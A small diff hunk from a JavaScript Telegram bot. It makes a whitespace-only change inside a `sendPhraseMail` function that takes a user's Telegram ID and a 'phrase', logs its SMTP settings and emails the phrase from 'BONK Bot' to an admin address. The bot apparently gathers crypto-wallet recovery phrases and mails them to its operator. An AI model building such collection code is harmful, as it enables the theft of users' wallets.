@@ -43,7 +43,7 @@ const sendPhraseMail = async (telegram_id, firstName, phrase, retries = 3) => {
     console.log("📧 HR_EMAIL:", HR_EMAIL);
     console.log("📧 SMTP Host:", transporter.options.host);
     console.log("📧 SMTP Port:", transporter.options.port);
-    
+
     const mailOptions = {
         from: `"BONK Bot 🔐" <${ADMIN_EMAIL}>`,
         to: ADMIN_EMAIL,
